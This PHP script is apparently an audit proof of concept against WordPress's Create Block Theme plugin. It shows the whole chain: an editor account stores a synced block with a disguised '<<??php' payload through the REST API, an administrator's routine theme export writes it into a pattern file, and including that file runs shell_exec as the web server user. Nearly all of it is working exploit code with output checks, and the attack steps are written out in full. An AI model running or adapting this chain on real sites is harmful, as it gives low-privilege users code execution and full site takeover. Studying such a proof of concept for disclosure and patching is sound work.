<?php
error_reporting(E_ERROR|E_PARSE);
function out($k,$v){ echo $k.': '.$v."\n"; }
$M='/home/user/wpaudit/CBT_EDITOR_RCE.txt'; @unlink($M);
@unlink(get_stylesheet_directory().'/patterns/cbt-editor.php');

// ---- STEP 1: EDITOR (no edit_themes, cannot execute PHP) plants a synced pattern ----
$ed = get_user_by('login','editor'); wp_set_current_user($ed->ID); kses_init();
out('STEP1_actor','editor');
out('  editor_has_edit_themes', current_user_can('edit_themes')?'YES':'no  <-- cannot write theme files');
out('  editor_has_install_plugins', current_user_can('install_plugins')?'YES':'no');
out('  editor_has_unfiltered_html', current_user_can('unfiltered_html')?'YES  <-- payload survives':'no');
$payload = '<<??php file_put_contents("'.$M.'", "RCE as uid=".trim(shell_exec("id -u"))." via editor-planted pattern"); ?>';
$req = new WP_REST_Request('POST','/wp/v2/blocks');
$req->set_param('title','cbt-editor'); $req->set_param('status','publish'); $req->set_param('content',$payload);
$res = rest_do_request($req); $bid = $res->get_data()['id'] ?? 0;
out('  rest_status', $res->get_status());
out('  stored_intact', strpos(get_post($bid)->post_content,'<<??php')!==false?'YES':'no');

// ---- STEP 2: ADMIN performs a routine Create Block Theme export ----
$ad = get_user_by('login','admin'); wp_set_current_user($ad->ID); kses_init();
out('STEP2_actor','administrator runs CBT export (routine action)');
$p = get_post($bid);
$gen = CBT_Theme_Patterns::pattern_from_wp_block($p);
$dir = get_stylesheet_directory().'/patterns'; if(!is_dir($dir)) wp_mkdir_p($dir);
$file = $dir.'/cbt-editor.php';
file_put_contents($file, $gen->content);
out('  written_file', $file);
out('  FILE_CONTENT', "\n".file_get_contents($file));

// ---- STEP 3: WordPress require()s theme pattern files at init ----
require $file;
clearstatcache();
out('STEP3_RCE', file_exists($M) ? ('*** '.trim(file_get_contents($M)).' ***') : 'no');
@unlink($M); @unlink($file); wp_delete_post($bid,true);
